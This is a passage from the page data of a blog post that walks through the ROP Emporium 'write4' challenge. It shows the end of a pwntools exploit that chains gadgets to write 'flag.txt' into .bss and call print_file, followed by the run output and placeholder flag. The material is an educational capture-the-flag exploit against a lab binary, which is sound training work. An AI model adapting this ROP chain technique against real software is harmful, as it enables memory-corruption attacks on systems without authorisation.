number\",children:\"8\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#overwrite the base pointer\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` pop_r14_r15\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` bss_area\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"flag.txt\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` mov_r14_r15\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` pop_rdi\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` bss_area\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` print_file_addr\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"writeafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'\u003e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"recvall\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsx)(n.p,{children:\"Successful execution of our exploit above we get a correct flag.\"}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`vx@archie:write4$ python3 x.py \n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Starting \",(0,e.jsx)(n.span,{className:\"token class-name builtin\",children:\"local\"}),\" process \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'./write4'\"}),(0,e.jsx)(n.span,{className:\"token class-name builtin\",children:\":\"}),\" pid \",(0,e.jsx)(n.span,{className:\"token number\",children:\"7275\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Receiving all data: Done \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"45B\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"*\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Process \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'./write4'\"}),\" stopped with \",(0,e.jsx)(n.span,{className:\"token class-name builtin\",children:\"exit\"}),\" code -11 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"SIGSEGV\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"pid \",(0,e.jsx)(n.span,{className:\"token number\",children:\"7275\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"*\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\"  Thank you\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    ROPE\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"a_placeholder_32byte_flag\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})})]})}}var v=w;function y(a,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return f(_);})();\n;return Component;","toc":[{"value":"Introduction","url":"#introduction","depth":2},{"value":"Exploit","url":"#exploit","depth":2}],"frontMatter":{"readingTime":{"text":"11 min read","minutes":10.3,"time":618000,"words":2060},"slug":"ropemporium-write4","fileName":"ropemporium-write4.mdx","title":"Return-Oriented Programming - Write4","date":"2021-12-20","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory.","layout":"PostLayout","canonicalUrl":null}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.54,"time":32400,"words":108},"slug":["default"],"fileName":"default.md","name":"Martin Muthuri","avatar":"/static/images/avatar.png","occupation":"Software Developer","email":"thuri783@gmail.com","twitter":"https://twitter.com/0xhexski","github":"https://github.com/thuri10"}],"prev":{"title":"Static Analysis of Malware Strings","date":"2021-12-07T00:00:00.000Z","tags":["malware","reverse"],"draft":false,"summary":"Strings challenges contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?","images":[],"layout":"PostLayout","slug":"strings-malware"},"next":{"title":"Return-Oriented Programming - Split","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain.","layout":"PostLayout","canonicalUrl":null,"slug":"ropemporium-split"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["ropemporium-write4"]},"buildId":"SFG1FnXcokiOY1XEoN9G7","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>